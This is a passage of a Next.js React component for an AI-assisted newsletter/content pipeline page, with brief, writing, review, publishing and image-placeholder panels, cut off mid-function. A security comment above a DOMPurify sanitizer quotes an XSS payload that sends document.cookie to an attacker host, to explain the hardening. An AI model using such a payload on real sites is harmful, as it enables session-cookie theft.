"use client";

import { useState, useCallback, useMemo, useRef } from "react";
import DOMPurify from "isomorphic-dompurify";
import { useParams, useRouter } from "next/navigation";
import { useQuery, useQueryClient } from "@tanstack/react-query";
import { toast } from "sonner";
import { api } from "@/lib/api";
import { useLocale } from "@/hooks/use-locale";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Input } from "@/components/ui/input";
import { ChannelIcon } from "@/components/ui/channel-icon";
import { PipelineStatusBadge } from "../components/status-badge";
import { PipelineStepper, STAGE_PANEL_MAP } from "../components/pipeline-stepper";
import { RejectReasonDialog } from "@/components/molecules/reject-reason-dialog";
import {
  ComposerShell,
  AiComposeToolbar,
  EmojiPickerTrigger,
  DraftSaver,
  useDraftSaver,
  type AiActionContext,
  type VoiceCardSummary,
} from "@/components/composer";
import {
  getVoiceCards,
  rewriteContent,
  type VoiceCardDoc,
} from "@/lib/api/content";
import { insertAtCaret } from "@/lib/composer/caret";
import { SchedulerComposer } from "@/components/scheduler/scheduler-composer";
import type { ScheduleSourceType } from "@/lib/scheduler/types";
import { sourceTextHash } from "@/lib/scheduler/source-hash";
import {
  ArrowLeft,
  Loader2,
  Sparkles,
  FileText,
  Pen,
  Send,
  CheckCircle,
  XCircle,
  ExternalLink,
  Eye,
  Star,
  StickyNote,
  Image as ImageIcon,
  X,
  Lock,
  GitCompare,
  Link2,
  Check,
} from "lucide-react";

/* ── SSE stream reader (reusable for any streaming action) ── */

const SKILL_LABELS: Record<string, string> = {
  analyse_library: "Analysing content library",
  check_seasonality: "Checking seasonality",
  check_news: "Checking latest news",
  score_idea: "Scoring idea",
  generate_brief: "Generating brief",
  write_newsletter: "Writing newsletter",
  audience_insights: "Getting audience insights",
  extract_content: "Reading article content",
};

interface StreamProgress { step: number; tools: string[]; label: string }

/**
 * XSS hardening (audit critical #2). Strategist content originates
 * from:
 *  - The AI writer (trusted-ish; output schema constrains tags but
 *    the LLM could theoretically emit `<script>` inside one of the
 *    allowed elements).
 *  - User edits in our textarea (untrusted — anything goes).
 *  - Beehiiv API responses pulled via webhook (untrusted — Beehiiv
 *    could be compromised, or the publication could have malicious
 *    third-party embeds).
 *
 * The Versions tab + WriteTab preview render this content via
 * `dangerouslySetInnerHTML`. Without sanitization, a malicious
 * `<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>`
 * inside any of those sources executes as soon as the user opens
 * the panel. Wrap every untrusted-HTML render through
 * `sanitizeContentHtml` which drops script tags, event handlers,
 * and javascript: URLs while preserving the semantic markup the
 * writers actually emit.
 *
 * Allow-list intentionally tight: same tags + attrs the
 * write-newsletter prompt promises to produce + standard inline
 * formatting + safe links/images. Anything else gets stripped.
 */
function sanitizeContentHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      "h1", "h2", "h3", "h4", "h5", "h6",
      "p", "br", "hr",
      "ul", "ol", "li",
      "blockquote", "pre", "code",
      "strong", "em", "b", "i", "u", "s", "small", "sub", "sup",
      "a", "img", "figure", "figcaption",
      "table", "thead", "tbody", "tr", "th", "td",
      "div", "span",
    ],
    ALLOWED_ATTR: ["href", "src", "alt", "title", "target", "rel", "class", "data-quote", "data-attributed-to", "data-placeholder", "data-pending", "data-index", "data-disclosure"],
    // Force-strip javascript: URLs and event handlers — the default
    // DOMPurify policy already does this but be explicit.
    ALLOWED_URI_REGEXP: /^(?:https?:|data:image\/|mailto:|tel:|#|\/)/i,
  });
}

async function consumeSSE(
  res: Response,
  onStep: (p: StreamProgress) => void,
): Promise<{ event: string; data: Record<string, unknown> }> {
  const ct = res.headers.get("content-type") || "";
  if (!ct.includes("text/event-stream")) {
    const json = (await res.json().catch(() => null)) as
      | { error?: { message?: string } }
      | null;
    throw new Error(json?.error?.message || "Unexpected response format");
  }

  const reader = res.body?.getReader();
  if (!reader) throw new Error("Streaming not supported");

  const decoder = new TextDecoder();
  let buffer = "";
  let lastEvent: { event: string; data: Record<string, unknown> } | null = null;

  while (true) {
    const { done, value } = await reader.read();
    if (done) break;

    buffer += decoder.decode(value, { stream: true });
    const events = buffer.split("\n\n");
    buffer = events.pop() || "";

    for (const raw of events) {
      const lines = raw.split("\n");
      let eventType = "";
      let data = "";
      for (const line of lines) {
        if (line.startsWith("event:")) eventType = line.slice(6).trim();
        else if (line.startsWith("data:")) data = line.slice(5).trim();
      }
      if (!data) continue;
      try {
        const parsed = JSON.parse(data) as Record<string, unknown>;
        if (eventType === "step") {
          const tools = (parsed.tools as string[] | undefined) || [];
          const toolName = tools[0] || "";
          onStep({ step: parsed.step as number, tools, label: SKILL_LABELS[toolName] || toolName });
        }
        lastEvent = { event: eventType, data: parsed };
      } catch { /* skip malformed */ }
    }
  }

  if (!lastEvent) throw new Error("Stream ended without a result");
  if (lastEvent.event === "error") throw new Error((lastEvent.data.message as string) || "Generation failed");
  return lastEvent;
}

interface ImagePlaceholder {
  position: "hero" | "inline-after-section-1" | "inline-after-section-2" | "inline-after-section-3" | "pull-quote" | "closing";
  purpose: string;
  description: string;
  suggestedAltText: string;
  suggestedCaption?: string;
  dimensions: "16:9" | "1:1" | "4:5" | "9:16";
  styleHints?: string[];
  status: "placeholder" | "generated" | "uploaded" | "supplied" | "deleted";
  resolvedImageUrl?: string;
}

interface IdeaDetail {
  _id: string;
  title: string;
  description?: string;
  status: string;
  source?: string;
  sector?: string;
  targetAudience?: string;
  contentType?: string;
  contentFormat?: "newsletter" | "article" | "pr" | "advertorial";
  angle?: string;
  aiScore?: number;
  channels?: string[];
  priority?: number;
  targetDate?: string;
  scheduledAt?: string;
  tags?: string[];
  notes?: string;
  brief?: {
    title: string; hook: string; angle: string; targetAudience: string;
    contentType?: string;
    keyDataPoints: (string | { claim: string; source?: string; sourceUrl?: string; confidence: "verified" | "inferred" | "ai_estimated" })[];
    outline: string[];
    estimatedLength: string; toneGuidance: string;
    suggestedPublishDay?: string; whyNow: string; generatedAt: string;
    articleMeta?: {
      metaDescription?: string;
      slug?: string;
      byline?: string;
      seoKeywords?: string[];
    };
    prMeta?: {
      dateline?: string;
      embargoUntil?: string;
      mediaContact?: { name: string; email: string; phone?: string };
      quoteCandidates?: Array<{
        attributedTo: string;
        role: string;
        suggestedQuote?: string;
        status: "suggested" | "confirmed" | "user_provided" | "rejected";
      }>;
    };
    advertorialMeta?: {
      sponsorName?: string;
      sponsorLogoUrl?: string;
      disclosureCopy?: string;
      ctaBlock?: { label: string; url: string; style?: "primary" | "secondary" | "ghost" };
    };
  };
  content?: {
    html: string; subject: string; previewText?: string;
    wordCount: number; version: number; lastEditedAt?: string;
    dataCitations?: { claim: string; source?: string; sourceUrl?: string; confidence: "verified" | "inferred" | "ai_estimated" }[];
    // PR 11 — per-format extras + image placeholders.
    metaDescription?: string;
    slug?: string;
    canonicalUrl?: string;
    byline?: string;
    deck?: string;
    imagePlaceholders?: ImagePlaceholder[];
    writerSkill?: string;
    finalAcceptanceRate?: number;
    finalEditCount?: number;
    aiAcceptanceRate?: number;
    textFinalizedAt?: string;
  };
  review?: { submittedAt?: string; verdict?: string; notes?: string };
  publishing?: { beehiivPostId?: string; beehiivUrl?: string; publishedAt?: string };
  createdAt?: string;
  updatedAt?: string;
}

type Panel = "overview" | "brief" | "write" | "review" | "publish" | "versions";

const ACTION_LABELS: Record<string, string> = {
  "submit-review": "Submitted for review",
  approve: "Content approved",
  "reject-review": "Revision requested",
  schedule: "Scheduled",
  publish: "Pushed to Beehiiv",
};

export default function IdeaDetailPage() {
  const params = useParams();
  const router = useRouter();
  const queryClient = useQueryClient();
  const ideaId = params.id as string;
  const [activePanel, setActivePanel] = useState<Panel>("overview");
  const [loading, setLoading] = useState<string | null>(null);

  const { data: idea, isLoading } = useQuery({
    queryKey: ["idea-detail", ideaId],
    queryFn: () => api.get<IdeaDetail>(`/v1/content/ideas/${ideaId}`),
  });

  // Sync activePanel with idea.status when status changes (without setState-in-effect).
  // Track the last seen status; when it changes, derive the new panel during render.
  const [lastSyncedStatus, setLastSyncedStatus] = useState<string | undefined>(undefined);
  if (idea?.status && idea.status !== lastSyncedStatus) {
    setLastSyncedStatus(idea.status);
    setActivePanel((STAGE_PANEL_MAP[idea.status] || "overview") as Panel);
  }

  const refresh = useCallback(() => {
    queryClient.invalidateQueries({ queryKey: ["idea-detail", ideaId] });
    queryClient.invalidateQueries({ queryKey: ["pipeline-ideas"] });
  }, [queryClient, ideaId]);

  /**
   * Returns true on success, false on caught failure. Existing callers
   * (approve / submit-review / schedule / publish) ignore the return
   * — fire-and-forget. The reject flow uses the boolean to bridge
   * into RejectReasonDialog's "throw to stay open" contract: the
   * dialog auto-closes on resolve, so a swallowed-error void return
   * would close the dialog after a failed reject.
   */
  async function action(path: string, body?: Record<string, unknown>): Promise<boolean> {
    setLoading(path);
    try {
      await api.post(`/v1/content/ideas/${ideaId}/${path}`, body || {});
      refresh();
      toast.success(ACTION_LABELS[path] || "Done");
      setLoading(null);
      return true;
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Action failed");
      setLoading(null);
      return false;
    }
  }

  if (isLoading || !idea) {
    return (
      <div className="flex items-center justify-center py-32">
        <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" />
      </div>
    );
  }

  return (
    <div className="space-y-6">
      {/* Back + Header */}
      <div>
        <button
          onClick={() => router.push("/dashboard/strategist")}
          className="mb-4 flex items-center gap-2 text-sm text-muted-foreground transition-colors hover:text-foreground"
        >
          <ArrowLeft className="h-4 w-4" />
          Back to Pipeline
        </button>

        <div className="flex items-start justify-between">
          <div>
            <div className="mb-2 flex items-center gap-2">
              <PipelineStatusBadge status={idea.status} />
              {idea.aiScore != null && (
                <Badge variant="secondary" className="text-xs">Score: {idea.aiScore}</Badge>
              )}
            </div>
            <h1 className="text-2xl font-bold tracking-tight">{idea.title}</h1>
            {idea.description && (
              <p className="mt-1 max-w-2xl text-muted-foreground">{idea.description}</p>
            )}
          </div>
          <div className="flex flex-wrap gap-2">
            {idea.sector && <Badge variant="outline">{idea.sector}</Badge>}
            {idea.contentType && <Badge variant="secondary">{idea.contentType}</Badge>}
          </div>
        </div>
      </div>

      {/* Pipeline Stepper — clickable, replaces tabs */}
      <PipelineStepper
        currentStatus={idea.status}
        activePanel={activePanel === "versions" ? "publish" : activePanel}
        onStepClick={(panel) => setActivePanel(panel as Panel)}
      />

      {/* Versions tab is shown as a secondary link when content has
          ever been sent (any acceptanceRate present, or status reached
          published). Keeps the main stepper visually clean — the
          Versions view is for post-publish credibility surfacing
          (locked decision L7), not part of the editorial flow. */}
      {(idea.content?.finalAcceptanceRate !== undefined ||
        idea.content?.aiAcceptanceRate !== undefined ||
        idea.status === "published") && (
        <div className="flex justify-end">
          <button
            type="button"
            onClick={() => setActivePanel(activePanel === "versions" ? "publish" : "versions")}
            className={`text-xs font-medium px-3 py-1.5 rounded-md transition-colors flex items-center gap-1.5 ${
              activePanel === "versions"
                ? "bg-primary text-primary-foreground"
                : "border bg-background hover:bg-accent"
            }`}
          >
            <GitCompare className="h-3.5 w-3.5" />
            Versions {typeof idea.content?.finalAcceptanceRate === "number"
              ? `· AI contribution ${Math.round(idea.content.finalAcceptanceRate * 100)}%`
              : ""}
          </button>
        </div>
      )}

      {/* Content panel for active step */}
      <div>
        {activePanel === "overview" && <OverviewTab idea={idea} />}
        {activePanel === "brief" && <BriefTab idea={idea} ideaId={ideaId} onRefresh={refresh} />}
        {activePanel === "write" && <WriteTab idea={idea} ideaId={ideaId} onRefresh={refresh} />}
        {activePanel === "review" && (
          <ReviewTab
            idea={idea}
            loading={loading}
            onSubmitReview={() => action("submit-review")}
            onApprove={() => action("approve")}
            onReject={async (notes: string) => {
              // Throw on failure so RejectReasonDialog stays open;
              // resolve on success so it auto-closes.
              const ok = await action("reject-review", { notes });
              if (!ok) throw new Error("reject-review failed");
            }}
          />
        )}
        {activePanel === "publish" && <PublishTab idea={idea} loading={loading} onPublish={() => action("publish")} onScheduled={refresh} />}
        {activePanel === "versions" && <VersionsTab ideaId={ideaId} />}
      </div>
    </div>
  );
}

function OverviewTab({ idea }: { idea: IdeaDetail }) {
  const { formatDate, formatDateTime } = useLocale();
  return (
    <div className="space-y-4">
      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader><CardTitle className="text-sm">Metadata</CardTitle></CardHeader>
          <CardContent>
            <dl className="space-y-2 text-sm">
              {[
                ["Source", idea.source],
                ["Sector", idea.sector],
                ["Audience", idea.targetAudience],
                ["Type", idea.contentType],
                ["Angle", idea.angle],
              ].map(([l, v]) =>
                v ? <div key={l as string} className="flex justify-between"><dt className="text-muted-foreground">{l}</dt><dd>{v}</dd></div> : null
              )}
              {/* Priority */}
              <div className="flex justify-between">
                <dt className="text-muted-foreground">Priority</dt>
                <dd className="flex gap-0.5">
                  {idea.priority
                    ? Array.from({ length: 5 }, (_, i) => (
                        <Star
                          key={i}
                          className={`h-3.5 w-3.5 ${
                            i < idea.priority!
                              ? "fill-amber-400 text-amber-400"
                              : "text-muted-foreground/25"
                          }`}
                        />
                      ))
                    : <span className="text-muted-foreground/50">Not set</span>
                  }
                </dd>
              </div>
              {/* Channels */}
              {idea.channels && idea.channels.length > 0 && (
                <div className="flex justify-between">
                  <dt className="text-muted-foreground">Channels</dt>
                  <dd className="flex flex-wrap gap-2">
                    {idea.channels.map((ch) => (
                      <ChannelIcon key={ch} channel={ch} size={14} />
                    ))}
                  </dd>
                </div>
              )}
            </dl>
          </CardContent>
        </Card>
        <Card>
          <CardHeader><CardTitle className="text-sm">Timeline</CardTitle></CardHeader>
          <CardContent>
            <dl className="space-y-2 text-sm">
              {[
                ["Created", idea.createdAt ? formatDate(idea.createdAt) : null],
                ["Updated", idea.updatedAt ? formatDate(idea.updatedAt) : null],
                ["Target", idea.targetDate ? formatDate(idea.targetDate) : null],
                ["Scheduled", idea.scheduledAt ? formatDateTime(idea.scheduledAt) : null],
              ].map(([l, v]) =>
                v ? <div key={l as string} className="flex justify-between"><dt className="text-muted-foreground">{l}</dt><dd>{v}</dd></div> : null
              )}
            </dl>
          </CardContent>
        </Card>
      </div>

      {/* Tags */}
      {idea.tags && idea.tags.length > 0 && (
        <Card>
          <CardHeader><CardTitle className="text-sm">Tags</CardTitle></CardHeader>
          <CardContent>
            <div className="flex flex-wrap gap-1.5">
              {idea.tags.map((tag) => (
                <Badge key={tag} variant="secondary" className="text-xs">{tag}</Badge>
              ))}
            </div>
          </CardContent>
        </Card>
      )}

      {/* Notes */}
      <Card>
        <CardHeader>
          <CardTitle className="text-sm flex items-center gap-1.5">
            <StickyNote className="h-3.5 w-3.5" />
            Notes
          </CardTitle>
        </CardHeader>
        <CardContent>
          {idea.notes
            ? <p className="text-sm whitespace-pre-wrap">{idea.notes}</p>
            : <p className="text-sm text-muted-foreground/50">No notes added.</p>
          }
        </CardContent>
      </Card>
    </div>
  );
}

function BriefTab({ idea, ideaId, onRefresh }: { idea: IdeaDetail; ideaId: string; onRefresh: () => void }) {
  const [generating, setGenerating] = useState(false);
  const [progress, setProgress] = useState<StreamProgress | null>(null);

  const generate = useCallback(async () => {
    setGenerating(true);
    setProgress(null);
    try {
      const res = await api.streamPost(`/v1/content/ideas/${ideaId}/generate-brief`);
      const result = await consumeSSE(res, setProgress);
      if (result.event === "complete") {
        toast.success("Brief generated");
        onRefresh();
      }
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Brief generation failed");
    }
    setGenerating(false);
    setProgress(null);
  }, [ideaId, onRefresh]);

  if (!idea.brief) {
    return (
      <Card>
        <CardContent className="py-12 text-center">
          {generating ? (
            <>
              <Loader2 className="mx-auto mb-3 h-10 w-10 animate-spin text-primary" />
              <p className="mb-1 font-medium">Generating brief...</p>
              {progress && (
                <p className="text-sm text-muted-foreground animate-pulse">
                  Step {progress.step}: {progress.label}
                </p>
              )}
            </>
          ) : (
            <>
              <FileText className="mx-auto mb-3 h-10 w-10 text-muted-foreground/30" />
              <p className="mb-4 text-muted-foreground">No brief generated yet.</p>
              <Button onClick={generate}>
                <Sparkles className="mr-1.5 h-4 w-4" />
                Generate Brief
              </Button>
            </>
          )}
        </CardContent>
      </Card>
    );
  }

  const b = idea.brief;
  return (
    <div className="space-y-4">
      <Card>
        <CardHeader>
          <CardTitle>{b.title}</CardTitle>
          <CardDescription className="italic">{b.hook}</CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-3 sm:grid-cols-3">
            {[["Angle", b.angle], ["Audience", b.targetAudience], ["Type", b.contentType], ["Length", b.estimatedLength], ["Publish Day", b.suggestedPublishDay]].map(([l, v]) =>
              v ? <div key={l as string}><p className="text-xs text-muted-foreground">{l}</p><p className="text-sm font-medium">{v}</p></div> : null
            )}
          </div>
          <div><p className="text-xs text-muted-foreground">Tone</p><p className="text-sm">{b.toneGuidance}</p></div>
          {b.whyNow && <div><p className="text-xs text-muted-foreground">Why Now</p><p className="text-sm">{b.whyNow}</p></div>}
        </CardContent>
      </Card>
      <div className="grid gap-4 md:grid-cols-2">
        <Card>
          <CardHeader><CardTitle className="text-sm">Key Data Points</CardTitle></CardHeader>
          <CardContent><ul className="space-y-3">{b.keyDataPoints.map((p, i) => {
            const isObj = typeof p !== "string";
            const claim = isObj ? p.claim : p;
            const confidence = isObj ? p.confidence : undefined;
            const dotColor = confidence === "verified" ? "bg-emerald-500" : confidence === "inferred" ? "bg-amber-500" : confidence === "ai_estimated" ? "bg-red-400" : "bg-primary";
            return (
              <li key={i} className="text-sm">
                <div className="flex items-start gap-2">
                  <span className={`mt-1.5 h-2 w-2 shrink-0 rounded-full ${dotColor}`} />
                  <span>{claim}</span>
                </div>
                {isObj && (
                  <div className="ml-4 mt-1 flex items-center gap-2">
                    <Badge variant={confidence === "verified" ? "default" : confidence === "inferred" ? "secondary" : "destructive"} className="text-[10px]">{confidence}</Badge>
                    {p.source && p.sourceUrl ? (
                      <a href={p.sourceUrl} target="_blank" rel="noopener noreferrer" className="text-xs text-primary hover:underline flex items-center gap-1">{p.source} <ExternalLink className="h-3 w-3" /></a>
                    ) : p.source ? (
                      <span className="text-xs text-muted-foreground">{p.source}</span>
                    ) : null}
                  </div>
                )}
              </li>
            );
          })}</ul></CardContent>
        </Card>
        <Card>
          <CardHeader><CardTitle className="text-sm">Outline</CardTitle></CardHeader>
          <CardContent><ol className="space-y-1.5">{b.outline.map((s, i) => <li key={i} className="text-sm"><span className="mr-2 text-muted-foreground">{i + 1}.</span>{s}</li>)}</ol></CardContent>
        </Card>
      </div>
      <BriefFormatMetaPanel brief={b} contentFormat={idea.contentFormat} />
    </div>
  );
}

/**
 * Format-conditional brief metadata panel — renders only when the
 * idea's contentFormat surfaces the matching meta sub-block from
 * the brief. Newsletter has no meta block (subject/previewText live
 * on content directly). Read-only in this PR — full editor lands in
 * a follow-up; surfacing the data is the foundation.
 */
function BriefFormatMetaPanel({
  brief,
  contentFormat,
}: {
  brief: NonNullable<IdeaDetail["brief"]>;
  contentFormat?: IdeaDetail["contentFormat"];
}) {
  if (!contentFormat || contentFormat === "newsletter") return null;

  if (contentFormat === "article" && brief.articleMeta) {
    const m = brief.articleMeta;
    return (
      <Card>
        <CardHeader>
          <CardTitle className="text-sm">Article metadata</CardTitle>
          <CardDescription className="text-xs">SEO + byline applied at publish</CardDescription>
        </CardHeader>
        <CardContent className="grid gap-3 sm:grid-cols-2">
          {m.byline && <div><p className="text-xs text-muted-foreground">Byline</p><p className="text-sm font-medium">{m.byline}</p></div>}
          {m.slug && <div><p className="text-xs text-muted-foreground">Slug</p><p className="text-sm font-mono">{m.slug}</p></div>}
          {m.metaDescription && <div className="sm:col-span-2"><p className="text-xs text-muted-foreground">Meta description (≤160 chars)</p><p className="text-sm">{m.metaDescription}</p></div>}
          {m.seoKeywords?.length ? <div className="sm:col-span-2"><p className="text-xs text-muted-foreground">SEO keywords</p><div className="flex flex-wrap gap-1.5 mt-1">{m.seoKeywords.map((k) => <Badge key={k} variant="secondary" className="text-[10px]">{k}</Badge>)}</div></div> : null}
        </CardContent>
      </Card>
    );
  }

  if (contentFormat === "pr" && brief.prMeta) {
    const m = brief.prMeta;
    const blockingQuotes = (m.quoteCandidates ?? []).filter((q) => q.status === "suggested" && !q.suggestedQuote);
    return (
      <Card>
        <CardHeader>
          <CardTitle className="text-sm">Press-release metadata</CardTitle>
          <CardDescription className="text-xs">
            {blockingQuotes.length > 0
              ? <span className="text-red-600 font-medium">{blockingQuotes.length} quote(s) need confirmation before publish</span>
              : "Dateline + quotes + contact for the wire"}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="grid gap-3 sm:grid-cols-2">
            {m.dateline && <div><p className="text-xs text-muted-foreground">Dateline</p><p className="text-sm font-medium">{m.dateline}</p></div>}
            {m.embargoUntil && <div><p className="text-xs text-muted-foreground">Embargo until</p><p className="text-sm">{new Date(m.embargoUntil).toLocaleDateString()}</p></div>}
            {m.mediaContact && (
              <div className="sm:col-span-2">
                <p className="text-xs text-muted-foreground">Media contact</p>
                <p className="text-sm">{m.mediaContact.name} · <a href={`mailto:${m.mediaContact.email}`} className="text-primary hover:underline">{m.mediaContact.email}</a>{m.mediaContact.phone ? ` · ${m.mediaContact.phone}` : ""}</p>
              </div>
            )}
          </div>
          {(m.quoteCandidates ?? []).length > 0 && (
            <div>
              <p className="text-xs text-muted-foreground mb-2">Quote candidates</p>
              <ul className="space-y-2">
                {m.quoteCandidates!.map((q, i) => {
                  const statusTone =
                    q.status === "confirmed" || q.status === "user_provided"
                      ? "default"
                      : q.status === "rejected"
                        ? "outline"
                        : "destructive";
                  return (
                    <li key={i} className="rounded-md border bg-muted/30 p-3 text-sm">
                      <div className="flex items-center justify-between gap-2 mb-1">
                        <span className="font-medium">{q.attributedTo}</span>
                        <Badge variant={statusTone} className="text-[10px]">{q.status}</Badge>
                      </div>
                      <p className="text-xs text-muted-foreground mb-1">{q.role}</p>
                      {q.suggestedQuote
                        ? <p className="italic">&ldquo;{q.suggestedQuote}&rdquo;</p>
                        : <p className="text-xs text-muted-foreground italic">(empty — Suggest Quote helper not yet run, or quote pending confirmation from {q.attributedTo})</p>}
                    </li>
                  );
                })}
              </ul>
            </div>
          )}
        </CardContent>
      </Card>
    );
  }

  if (contentFormat === "advertorial" && brief.advertorialMeta) {
    const m = brief.advertorialMeta;
    return (
      <Card>
        <CardHeader>
          <CardTitle className="text-sm">Advertorial metadata</CardTitle>
          <CardDescription className="text-xs">
            {m.disclosureCopy
              ? "Sponsor + disclosure + CTA"
              : <span className="text-amber-600 font-medium">No disclosure copy — Suggest Disclosure helper required before publish</span>}
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div className="grid gap-3 sm:grid-cols-2">
            {m.sponsorName && <div><p className="text-xs text-muted-foreground">Sponsor</p><p className="text-sm font-medium">{m.sponsorName}</p></div>}
            {m.ctaBlock && (
              <div>
                <p className="text-xs text-muted-foreground">CTA</p>
                <p className="text-sm">{m.ctaBlock.label} → <a href={m.ctaBlock.url} target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">{m.ctaBlock.url}</a></p>
              </div>
            )}
          </div>
          {m.disclosureCopy && (
            <div>
              <p className="text-xs text-muted-foreground mb-1">Disclosure (FTC)</p>
              <p className="text-sm bg-amber-50 dark:bg-amber-950/30 border border-amber-200 dark:border-amber-900 rounded-md p-3">{m.disclosureCopy}</p>
            </div>
          )}
        </CardContent>
      </Card>
    );
  }

  return null;
}

/**
 * Image-placeholder rail — renders the writer's
 * content.imagePlaceholders[] inline with a delete affordance.
 * Phase 1: text-only; clicking a placeholder lets the user edit
 * description or remove it entirely. Phase 2 (image gen via
 * Vercel Gateway → Imagen) replaces status="placeholder" with
 * status="generated" + resolvedImageUrl on the same array entry.
 */
function ImagePlaceholderRail({
  placeholders,
  onDelete,
  onGenerate,
  onSupplyUrl,
  busy,
  finalized,
  generatingIndex,
  resolvingIndex,
}: {
  placeholders: ImagePlaceholder[];
  onDelete: (index: number) => void;
  onGenerate: (index: number) => void;
  /** Resolve a placeholder from an external URL (status "supplied"). */
  onSupplyUrl: (index: number, url: string) => void;
  busy: boolean;
  finalized: boolean;
  generatingIndex: number | null;
  resolvingIndex: number | null;
}) {
  if (!placeholders.length) return null;
  return (
    <Card>
      <CardHeader>
        <CardTitle className="text-sm flex items-center gap-2"><ImageIcon className="h-4 w-4" /> Image placeholders <span className="text-muted-foreground font-normal">({placeholders.length})</span></CardTitle>
        <CardDescription className="text-xs">
          {finalized
            ? "Text finalized — Generate an image with AI or paste an image URL per placeholder. Delete what you don't want first."
            : "Delete what you don't want; Finalize text to unlock image generation."}
        </CardDescription>
      </CardHeader>
      <CardContent>
        <ul className="grid gap-2 sm:grid-cols-2">
          {placeholders.map((p, i) => (
            <PlaceholderCard
              key={i}
              p={p}
              index={i}
              onDelete={onDelete}
              onGenerate={onGenerate}
              onSupplyUrl={onSupplyUrl}
              busy={busy}
              finalized={finalized}
              isGenerating={generatingIndex === i}
              isResolving={resolvingIndex === i}
            />
          ))}
        </ul>
      </CardContent>
    </Card>
  );
}

/**
 * One placeholder card. Owns its local paste-URL input toggle so the
 * parent rail stays stateless. Resolution paths:
 *   - Generate  → AI image pipeline (status "generated"), gated on finalize
 *   - Paste URL → external URL        (status "supplied"),  gated on finalize
 * (Library pick — status "uploaded" — lands with the Media Manager / R2
 * workstream; the data model + handler already accept it.)
 */
function PlaceholderCard({
  p,
  index,
  onDelete,
  onGenerate,
  onSupplyUrl,
  busy,
  finalized,
  isGenerating,
  isResolving,
}: {
  p: ImagePlaceholder;
  index: number;
  onDelete: (index: number) => void;
  onGenerate: (index: number) => void;
  onSupplyUrl: (index: number, url: string) => void;
  busy: boolean;
  finalized: boolean;
  isGenerating: boolean;
  isResolving: boolean;
}) {
  const [urlOpen, setUrlOpen] = useState(false);
  const [urlValue, setUrlValue] = useState("");
  const resolved = !!p.resolvedImageUrl &&
    (p.status === "generated" || p.status === "supplied" || p.status === "uploaded");
  const rowBusy = busy || isGenerating || isResolving;

  const statusLabel = p.status === "generated" ? "Generated"
    : p.status === "supplied" ? "From URL"
    : p.status === "uploaded" ? "From library"
    : null;

  function submitUrl() {
    const trimmed = urlValue.trim();
    if (!trimmed) return;
    onSupplyUrl(index, trimmed);
    setUrlOpen(false);
    setUrlValue("");
  }

  return (
    <li className={`rounded-md border p-3 text-sm flex items-start justify-between gap-2 ${resolved ? "bg-emerald-50/40 dark:bg-emerald-950/20 border-emerald-200 dark:border-emerald-900" : "bg-muted/20"}`}>
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-1.5 mb-1 flex-wrap">
          <Badge variant="outline" className="text-[10px]">{p.position}</Badge>
          <Badge variant="secondary" className="text-[10px]">{p.dimensions}</Badge>
          {statusLabel && <Badge variant="default" className="text-[10px]">{statusLabel}</Badge>}
        </div>
        <p className="font-medium truncate" title={p.purpose}>{p.purpose}</p>
        <p className="text-xs text-muted-foreground line-clamp-2">{p.description}</p>
        {p.suggestedCaption && <p className="text-xs italic mt-1 text-muted-foreground">&ldquo;{p.suggestedCaption}&rdquo;</p>}
        {resolved && p.resolvedImageUrl && (
          <div className="mt-2 rounded-md overflow-hidden border bg-background">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img src={p.resolvedImageUrl} alt={p.suggestedAltText} className="block w-full h-auto" />
          </div>
        )}
        <div className="mt-2 flex items-center gap-2 flex-wrap">
          <button
            type="button"
            onClick={() => onGenerate(index)}
            disabled={rowBusy || !finalized}
            className="text-xs font-medium px-2.5 py-1 rounded border bg-background hover:bg-accent disabled:opacity-40 flex items-center gap-1"
            title={finalized ? (resolved ? "Regenerate (overwrites the current image)" : "Generate image via AI") : "Finalize text first to unlock generation"}
          >
            {isGenerating
              ? <><Loader2 className="h-3 w-3 animate-spin" /> Generating…</>
              : resolved
                ? <><Sparkles className="h-3 w-3" /> Regenerate</>
                : <><Sparkles className="h-3 w-3" /> Generate</>}
          </button>
          <button
            type="button"
            onClick={() => setUrlOpen((v) => !v)}
            disabled={rowBusy || !finalized}
            className="text-xs font-medium px-2.5 py-1 rounded border bg-background hover:bg-accent disabled:opacity-40 flex items-center gap-1"
            title={finalized ? "Paste an image URL" : "Finalize text first to unlock"}
          >
            {isResolving ? <Loader2 className="h-3 w-3 animate-spin" /> : <Link2 className="h-3 w-3" />} Paste URL
          </button>
        </div>
        {urlOpen && (
          <div className="mt-2 flex items-center gap-1.5">
            <Input
              value={urlValue}
              onChange={(e) => setUrlValue(e.target.value)}
              onKeyDown={(e) => { if (e.key === "Enter") { e.preventDefault(); submitUrl(); } }}
              placeholder="https://…/image.jpg"
              className="h-7 text-xs"
              autoFocus
            />
            <button
              type="button"
              onClick={submitUrl}
              disabled={rowBusy || !urlValue.trim()}
              className="shrink-0 text-xs font-medium px-2 py-1 rounded border bg-background hover:bg-accent disabled:opacity-40 flex items-center gap-1"
              aria-label="Set image URL"
            >
              <Check className="h-3 w-3" /> Set
            </button>
          </div>
        )}
      </div>
      <button
        type="button"
        onClick={() => onDelete(index)}
        disabled={rowBusy}
        className="shrink-0 text-muted-foreground hover:text-destructive disabled:opacity-40"
        aria-label={`Delete placeholder ${index + 1}`}
        title="Delete placeholder"
      >
        <X className="h-4 w-4" />
      </button>
    </li>
  );
}

/**
 * Finalize gate — locks the text content so the Images stage
 * (Phase 2) can run without further text edits. Today emits a
 * signal-style PUT to /v1/content/ideas/:id/content with a
 * finalizedAt stamp; the b2c then surfaces a "Locked" badge.
 * No status transition — that lands when Phase 2 ships the
 * Images tab. In the interim, the visible Finalize button sets
 * the mental model for the editorial gate.
 */
function FinalizeButton({
  finalized,
  busy,
  onFinalize,
}: {
  finalized: boolean;
